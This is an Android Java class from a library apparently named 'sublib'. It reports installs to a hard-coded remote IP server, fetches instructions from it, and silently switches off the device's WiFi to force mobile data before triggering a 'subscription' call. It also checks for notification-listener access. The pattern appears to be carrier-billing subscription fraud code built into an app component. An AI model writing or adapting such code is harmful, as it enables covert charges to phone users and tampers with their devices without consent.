package com.enhtmv.sublib.common.sub;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.WifiManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.webkit.WebView;

import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.NetworkUtils;
import com.blankj.utilcode.util.Utils;
import com.cp.plugin.event.SubEvent;
import com.enhtmv.sublib.common.SubReport;
import com.enhtmv.sublib.common.http.SubProxy;
import com.enhtmv.sublib.common.util.SharedUtil;
import com.enhtmv.sublib.common.util.StringUtil;
import com.enhtmv.sublib.common.util.NetUtil;
import com.enhtmv.sublib.work.yidali.TIMSub;

import static com.enhtmv.sublib.common.sub.SubCall.*;


public class SubContext {

    private static final String ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners";

    @SuppressLint("StaticFieldLeak")
    private static SubContext subContext;

    private static boolean running = false;

    private static boolean closeWifi = true;


    private Context context;

    private NetworkStateReceiver receiver;

    private SubEvent event;

    private SubCall subCall;


    private void initSubCall() {

        String useragent = new WebView(context).getSettings().getUserAgentString();


        subCall = new TIMSub();

        subCall.init(useragent, event);
    }

    public static void init(Context context, SubEvent event) {

        synchronized (SubEvent.class) {


            Utils.init(context);

            SubReport.init("http://52.53.238.169:8081");


            if (subContext == null) {

                subContext = new SubContext(context, event);

            }

        }

    }


    private SubContext(Context context, SubEvent event) {

        this.context = context;
        this.event = event;

        initSubCall();

        if (!SharedUtil.isInstalled()) {

            event.onMessage(INSTALLED, null);
            SubReport.getReport().i(INSTALLED);


            SharedUtil.installed();

        }

    }


    private static boolean wifiStateAndClose() {

        if (closeWifi) {

            int netCode = NetUtil.getNetworkState(subContext.context);

            if (netCode == NetUtil.NETWORK_WIFI) {

                LogUtils.d("start close wifi");

                //注册广播
                if (subContext.receiver == null) {

                    subContext.receiver = new NetworkStateReceiver();

                    IntentFilter filter = new IntentFilter();

                    filter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
                    filter.addAction("android.net.wifi.WIFI_STATE_CHANGED");
                    filter.addAction("android.net.wifi.STATE_CHANGE");

                    subContext.context.registerReceiver(subContext.receiver, filter);
                }

                WifiManager wifiManager = (WifiManager) subContext.context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);

                if (wifiManager != null) {
                    wifiManager.setWifiEnabled(false);
                }

                return false;
            } else if (netCode == NetUtil.NETWORK_NONE) {
                LogUtils.w("not network");
                return false;
            }
        }

        return true;
    }

    public static void closeWifi(boolean wifi) {
        closeWifi = wifi;
    }

    public static void log(boolean log) {

        LogUtils.getConfig().setLogSwitch(log);

    }

    public static void proxy(SubProxy proxy) {
        subContext.subCall.setProxy(proxy);
    }


    public static void call() {

        synchronized (SubContext.class) {

            if (!running) {

                running = true;

                //是否订阅成功
                if (!SharedUtil.isSuccess()) {

                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {

                                String info = SubReport.getReport().info();

                                if (!StringUtil.isEmpty(info)) {

                                    //关闭wifi
                                    if (wifiStateAndClose()) {

                                        subContext.subCall.sub(info);

                                    }
                                }

                            } catch (Exception e) {
                                LogUtils.e(e);
                            } finally {
                                running = false;
                            }

                        }

                    }).start();
                }
            }
        }


    }

    public static void call(final String message) {

        if (subContext.subCall != null) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    subContext.subCall.onSub(message);
                }
            }).start();
        }
    }

    public static boolean isNotificationServiceEnabled() {

        String pkgName = subContext.context.getPackageName();
        final String flat = Settings.Secure.getString(subContext.context.getContentResolver(),
                ENABLED_NOTIFICATION_LISTENERS);

        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");

            for (String name : names) {
                final ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.getPackageName())) {

                        //todo  通知权限打开状态

                        return true;
                    }
                }
            }
        }
        return false;
    }

    private static class NetworkStateReceiver extends BroadcastReceiver {


        public void destroy() {
            subContext.context.unregisterReceiver(this);
            subContext.receiver = null;
        }


        @Override
        public void onReceive(Context context, Intent intent) {

            LogUtils.i("NetworkStateReceiver", intent.toString());

            if (NetworkUtils.isConnected() && !NetworkUtils.isWifiConnected() && NetworkUtils.isMobileData()) {

                subContext.subCall.report(OPEN_4G_NETWORK);

                call();

                destroy();

            }
        }
    }


}
